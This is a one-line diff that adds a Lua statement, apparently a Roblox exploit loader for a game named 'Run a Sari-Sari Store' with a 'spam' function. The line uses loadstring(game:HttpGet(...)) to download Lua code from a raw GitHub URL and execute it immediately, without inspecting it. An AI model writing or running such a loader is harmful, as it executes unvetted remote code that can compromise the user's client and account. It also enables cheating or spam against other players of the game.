@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Frontierpifurnace41/loaders/main/loaders/run-a-sari-sari-store-spam6-1c21pgjon629h2.lua"))()
